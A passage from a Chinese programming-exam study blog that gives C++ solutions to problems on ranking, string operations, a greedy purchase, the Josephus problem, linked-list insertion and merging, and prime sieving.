<span class="keyword">else</span> cty[i].rk[<span class="number">1</span>] = rk++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//金牌人口比例排名</span></span><br><span class="line">		<span class="built_in">sort</span>(cty, cty+cn, cmp3);</span><br><span class="line">		rk = <span class="number">1</span>;</span><br><span class="line">		cty[<span class="number">0</span>].rk[<span class="number">2</span>] = rk++;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; cn; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(cty[i].gold_per_person == cty[i<span class="number">-1</span>].gold_per_person)&#123;</span><br><span class="line">				cty[i].rk[<span class="number">2</span>] = cty[i<span class="number">-1</span>].rk[<span class="number">2</span>];</span><br><span class="line">				rk++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> cty[i].rk[<span class="number">2</span>] = rk++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//奖牌人口比例排名</span></span><br><span class="line">		<span class="built_in">stable_sort</span>(cty, cty+cn, cmp4);</span><br><span class="line">		rk = <span class="number">1</span>;</span><br><span class="line">		cty[<span class="number">0</span>].rk[<span class="number">3</span>] = rk++;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; cn; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(cty[i].prize_per_person == cty[i<span class="number">-1</span>].prize_per_person)&#123;</span><br><span class="line">				cty[i].rk[<span class="number">3</span>] = cty[i<span class="number">-1</span>].rk[<span class="number">3</span>];</span><br><span class="line">				rk++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> cty[i].rk[<span class="number">3</span>] = rk++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//按输入顺序排名</span></span><br><span class="line">		<span class="built_in">stable_sort</span>(cty, cty+cn, cmp0);</span><br><span class="line">		<span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; cn; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(cty[i].id == acn_id[idx])&#123;</span><br><span class="line">				idx++;</span><br><span class="line">				<span class="type">int</span> min_rk = cty[i].rk[<span class="number">0</span>], mrk_id = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line">					<span class="keyword">if</span>(min_rk &gt; cty[i].rk[j])&#123;</span><br><span class="line">						min_rk = cty[i].rk[j];</span><br><span class="line">						mrk_id = j+<span class="number">1</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d:%d\n&quot;</span>, min_rk, mrk_id);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h2 id="查找">查找</h2>
<p>可以sort+二分，也可以用map（和python的dic有点类似）</p>
<h3 id="查找---北邮">查找 - 北邮</h3>
<h5 id="题目描述-2">题目描述</h5>
<p>读入一组字符串（待操作的），再读入一个int
n记录记下来有几条命令，总共有2中命令：1、翻转
从下标为i的字符开始到i+len-1之间的字符串倒序；2、替换
命中如果第一位为1，用命令的第四位开始到最后的字符串替换原读入的字符串下标
i 到
i+len-1的字符串。每次执行一条命令后新的字符串代替旧的字符串（即下一条命令在作用在得到的新字符串上）。
命令格式：第一位0代表翻转，1代表替换；第二位代表待操作的字符串的起始下标int
i；第三位表示需要操作的字符串长度int len。</p>
<h5 id="输入输出格式-1">输入输出格式</h5>
<h6 id="输入描述-3">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">输入有多组数据。</span><br><span class="line">每组输入一个字符串（不大于<span class="number">100</span>）然后输入<span class="built_in">n</span>，再输入<span class="built_in">n</span>条指令（指令一定有效）。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-3">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">根据指令对字符串操作后输出结果。</span><br></pre></td></tr></table></figure>
<p>字符串操作，主要用substr</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	string str;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; str)&#123;</span><br><span class="line">		<span class="type">int</span> n;</span><br><span class="line">		cin &gt;&gt; n;</span><br><span class="line">		string opt, tmp, r;</span><br><span class="line">		<span class="type">int</span> choice, start, len;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			cin &gt;&gt; opt;</span><br><span class="line">			choice = opt[<span class="number">0</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">			start = opt[<span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">			len = opt[<span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">			<span class="keyword">if</span>(choice == <span class="number">0</span>)&#123;</span><br><span class="line">				tmp = str.<span class="built_in">substr</span>(start, len);</span><br><span class="line">				<span class="built_in">reverse</span>(tmp.<span class="built_in">begin</span>(), tmp.<span class="built_in">end</span>());</span><br><span class="line">				r = str.<span class="built_in">substr</span>(<span class="number">0</span>, start) + tmp + str.<span class="built_in">substr</span>(start+len);</span><br><span class="line">				str = r;</span><br><span class="line">				cout &lt;&lt; str &lt;&lt; endl;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				tmp = opt.<span class="built_in">substr</span>(<span class="number">3</span>);</span><br><span class="line">				r = str.<span class="built_in">substr</span>(<span class="number">0</span>, start) + tmp + str.<span class="built_in">substr</span>(start+len);</span><br><span class="line">				str = r;</span><br><span class="line">				cout &lt;&lt; str &lt;&lt; endl;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="贪心算法">贪心算法</h2>
<p>当前最优，常用sort。</p>
<h3 id="喝饮料">喝饮料</h3>
<h5 id="题目描述-3">题目描述</h5>
<p>商店里有n中饮料，第i种饮料有mi毫升，价格为wi。</p>
<p>小明现在手里有x元，他想吃尽量多的饮料，于是向你寻求帮助，怎么样买才能吃的最多。</p>
<p>请注意，每一种饮料都可以只买一部分。</p>
<h5 id="输入输出格式-2">输入输出格式</h5>
<h6 id="输入描述-4">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">有多组测试数据。</span><br><span class="line">第一行输入两个非负整数x和<span class="built_in">n</span>。</span><br><span class="line">接下来<span class="built_in">n</span>行，每行输入两个整数，分别为mi和wi。</span><br><span class="line">所有数据都不大于<span class="number">1000</span>。</span><br><span class="line">x和<span class="built_in">n</span>都为-<span class="number">1</span>时程序结束。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-4">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">请输出小明最多能喝到多少毫升的饮料，结果保留三位小数。</span><br></pre></td></tr></table></figure>
<p>找出单位价格最多饮料的</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">drink</span>&#123;</span><br><span class="line">	<span class="type">double</span> m, w;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">struct</span> drink a, <span class="keyword">struct</span> drink b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (a.m / a.w) &gt; (b.m / b.w);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">double</span> x;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; x &gt;&gt; n)&#123;</span><br><span class="line">		<span class="keyword">if</span>(x == <span class="number">-1</span> &amp;&amp; n == <span class="number">-1</span>) <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">struct</span> drink dk[n];</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">				cin &gt;&gt; dk[i].m &gt;&gt; dk[i].w;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">sort</span>(dk, dk+n, cmp);</span><br><span class="line"></span><br><span class="line">			<span class="type">double</span> r = <span class="number">0</span>;</span><br><span class="line">			<span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">while</span>(x &amp;&amp; idx &lt; n)&#123;</span><br><span class="line">				<span class="keyword">if</span>(x &gt; dk[idx].w)&#123;</span><br><span class="line">					x -= dk[idx].w;</span><br><span class="line">					r += dk[idx].m;</span><br><span class="line">					idx++;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					r += dk[idx].m / dk[idx].w * x;</span><br><span class="line">					x = <span class="number">0</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%.3lf\n&quot;</span>, r);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="链表">链表</h2>
<h3 id="猴子报数">猴子报数</h3>
<h5 id="题目描述-4">题目描述</h5>
<p>n个猴子围坐一圈并按照顺时针方向从1到n编号，从第s个猴子开始进行1到m的报数，报数到第m的猴子退出报数，从紧挨它的下一个猴子重新开始1到m的报数，如此进行下去知道所有的猴子都退出为止。求给出这n个猴子的退出的顺序表。</p>
<h5 id="输入输出格式-3">输入输出格式</h5>
<h6 id="输入描述-5">输入描述:</h6>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">有做组测试数据．每一组数据有两行，第一行输入n（表示猴子的总数最多为<span class="number">100</span>）第二行输入数据<span class="built_in">s</span>(从第s个猴子开始报数)和数据<span class="built_in">m</span>(第m个猴子退出报数)．当输入０　０　０时表示程序结束．</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-5">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">每组数据的输出结果为一行，中间用逗号间隔。</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">	<span class="type">int</span> num;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">node</span> *next;</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *<span class="built_in">setup</span>(<span class="type">int</span> n)&#123;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">node</span> *head, *tmp, *pre;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">		tmp = (<span class="keyword">struct</span> node *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(node));</span><br><span class="line">		<span class="keyword">if</span>(i == <span class="number">1</span>)&#123;</span><br><span class="line">			head = tmp;</span><br><span class="line">			pre = tmp;</span><br><span class="line">		&#125;</span><br><span class="line">		tmp-&gt;num = i;</span><br><span class="line">		tmp-&gt;next = head;</span><br><span class="line">		pre-&gt;next = tmp;</span><br><span class="line">		pre = tmp;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(<span class="keyword">struct</span> node *head, <span class="type">int</span> n, <span class="type">int</span> s, <span class="type">int</span> m)</span></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">node</span> *p, *pre;</span><br><span class="line">	p = head;</span><br><span class="line">	s--;</span><br><span class="line">	<span class="keyword">while</span>(s)&#123;</span><br><span class="line">		pre = p;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">		s--;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(p == p-&gt;next)&#123;</span><br><span class="line">			cout &lt;&lt; p-&gt;num &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(i % m == <span class="number">0</span>)&#123;</span><br><span class="line">				cout &lt;&lt; p-&gt;num &lt;&lt; <span class="string">&quot;,&quot;</span>;</span><br><span class="line">				pre-&gt;next = p-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> pre = p;</span><br><span class="line">			p = p-&gt;next;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n, s, m;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; s &gt;&gt; m)&#123;</span><br><span class="line">		<span class="keyword">if</span>(n == <span class="number">0</span> &amp;&amp; s == <span class="number">0</span> &amp;&amp; m == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">struct</span> node *head;</span><br><span class="line">			head = <span class="built_in">setup</span>(n);</span><br><span class="line">			<span class="built_in">print</span>(head, n, s, m);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="单链表">单链表</h3>
<h5 id="题目描述-5">题目描述</h5>
<p>设节点定义如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="type">int</span> Element; <span class="comment">// 节点中的元素为整数类型</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span> * Next; <span class="comment">// 指向下一个节点</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>从键盘输入5个整数，将这些整数插入到一个链表中，并按从小到大次序排列，最后输出这些整数。</p>
<p>直接插入，边插入边比较就行了</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="type">int</span> Element; <span class="comment">// 节点中的元素为整数类型</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span> * Next; <span class="comment">// 指向下一个节点</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">Node</span> *head = (<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Node));</span><br><span class="line">	head-&gt;Next = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">Node</span> *p;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">		p = head;</span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">Node</span> *tmp = (<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Node));</span><br><span class="line">		cin &gt;&gt; tmp-&gt;Element;</span><br><span class="line">		<span class="keyword">while</span>(p-&gt;Next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(tmp-&gt;Element &lt; p-&gt;Next-&gt;Element)&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			p = p-&gt;Next;</span><br><span class="line">		&#125;</span><br><span class="line">		tmp-&gt;Next = p-&gt;Next;</span><br><span class="line">		p-&gt;Next = tmp;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	head = head-&gt;Next;</span><br><span class="line">	<span class="keyword">while</span>(head != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		cout &lt;&lt; head-&gt;Element &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">		head = head-&gt;Next;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="链表合并">链表合并</h2>
<h5 id="题目描述-6">题目描述</h5>
<p>给定两个元素有序（从小到大）的链表，要求将两个链表合并成一个有序（从小到大）链表，</p>
<h5 id="输入输出格式-4">输入输出格式</h5>
<h6 id="输入描述-6">输入描述:</h6>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">第一行输入第一个链表的结点数<span class="built_in">S1</span>，<span class="built_in">S1</span>&lt;<span class="number">=100</span>。</span><br><span class="line">第二行输入<span class="built_in">S1</span>个整数，两两之间用空格隔开。</span><br><span class="line">第三行输入第二个链表的结点数<span class="built_in">S2</span>，<span class="built_in">S2</span>&lt;<span class="number">=100</span>。</span><br><span class="line">第四行输入<span class="built_in">S2</span>个整数，两两之间用空格隔开。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-6">输出描述:</h6>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">输出合并之后的链表结果，两两之间用空格隔开，末尾没有空格。</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> &#123;</span><br><span class="line">    <span class="type">int</span> element; <span class="comment">// 节点中的元素为整数类型</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">node</span> * next; <span class="comment">// 指向下一个节点</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *<span class="built_in">setup</span>(<span class="type">int</span> n)&#123;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">node</span> *head, *p;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">node</span> *tmp = <span class="keyword">new</span> node;</span><br><span class="line">		cin &gt;&gt; tmp-&gt;element;</span><br><span class="line">		<span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">			head = tmp;</span><br><span class="line">			p = head;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			tmp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">			p-&gt;next = tmp;</span><br><span class="line">			p = p-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">struct</span> node *head1, <span class="keyword">struct</span> node *head2)</span></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">node</span> *head, *p;</span><br><span class="line">	<span class="keyword">if</span>(head1-&gt;element &lt; head2-&gt;element)&#123;</span><br><span class="line">		head = head1;</span><br><span class="line">		head1 = head1-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		head = head2;</span><br><span class="line">		head2 = head2-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	p = head;</span><br><span class="line">	<span class="keyword">while</span>(head1 != <span class="literal">NULL</span> &amp;&amp; head2 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(head1-&gt;element &lt; head2-&gt;element)&#123;</span><br><span class="line">			p-&gt;next = head1;</span><br><span class="line">			head1 = head1-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			p-&gt;next = head2;</span><br><span class="line">			head2 = head2-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(head1 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		p-&gt;next = head1;</span><br><span class="line">		head1 = head1-&gt;next;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(head2 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		p-&gt;next = head2;</span><br><span class="line">		head2 = head2-&gt;next;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	p = head;</span><br><span class="line">	<span class="keyword">while</span>(p != <span class="literal">NULL</span>)&#123;</span><br><span class="line">		cout &lt;&lt; p-&gt;element &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n, m;</span><br><span class="line">	cin &gt;&gt; n;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">node</span> *head1, *head2;</span><br><span class="line">	head1 = <span class="built_in">setup</span>(n);</span><br><span class="line">	cin &gt;&gt; m;</span><br><span class="line">	head2 = <span class="built_in">setup</span>(m);</span><br><span class="line">	<span class="built_in">merge</span>(head1, head2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="数学">数学</h1>
<p>记住一些常见的，gcd，lcm， 斐波那契数列</p>
<h2 id="素数">素数</h2>
<p>记录一下欧拉筛，用到了vector结构，并且进行函数传参；</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">c++</span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1020</span>;</span><br><span class="line"><span class="type">bool</span> isnp[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> n, vector&lt;<span class="type">int</span>&gt; &amp;primes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isnp[i])</span><br><span class="line">            primes.<span class="built_in">push_back</span>(i);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; primes.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">        	<span class="type">int</span> p = primes[j];</span><br><span class="line">            <span class="keyword">if</span> (p * i &gt; n)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            isnp[p * i] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (i % p == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> a, b;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; a &gt;&gt; b)&#123;</span><br><span class="line">		<span class="keyword">if</span>(a &gt; b)&#123;</span><br><span class="line">			<span class="type">int</span> tmp = a;</span><br><span class="line">			a = b;</span><br><span class="line">			b = tmp;</span><br><span class="line">		&#125;</span><br><span class="line">		vector&lt;<span class="type">int</span>&gt; primes;</span><br><span class="line">		<span class="built_in">init</span>(b, primes);</span><br><span class="line">		<span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; primes.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">        	<span class="type">int</span> p = primes[j];</span><br><span class="line">			<span class="keyword">if</span>(p &gt;= a &amp;&amp; p &lt;= b)&#123;</span><br><span class="line">				cnt++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; cnt &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="质因数个数">质因数个数</h3>
<h5 id="题目描述-7">题目描述</h5>
<p>求正整数N(N&gt;1)的质因数的个数。
相同的质因数需要重复计算。如120=22235，共有5个质因数。</p>
<h5 id="输入输出格式-5">输入输出格式</h5>
<h6 id="输入描述-7">输入描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">可能有多组测试数据，每组测试数据的输入是一个正整数<span class="built_in">N</span>，(<span class="number">1</span>&lt;<span class="built_in">N</span>&lt;<span class="number">10</span>^<span class="number">9</span>)。</span><br></pre></td></tr></table></figure>
<h6 id="输出描述-7">输出描述:</h6>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">对于每组数据，输出<span class="built_in">N</span>的质因数的个数。</span><br></pre></td></tr></table></figure>
<p>虽然输入范围是1e9，但是实际上要求出来的素数范围不到1e5，还是可以用欧拉筛的，之后用素数表一个个试：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">10000000</span>;</span><br><span class="line"><span class="type">bool</span> isnp[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> n, vector&lt;<span class="type">int</span>&gt; &amp;primes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isnp[i])</span><br><span class="line">            primes.<span class="built_in">push_back</span>(i);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; primes.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">        	<span class="type">int</span> p = primes[j];</span><br><span class="line">            <span class="keyword">if</span> (p * i &gt; n)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            isnp[p * i] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (i % p == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(cin 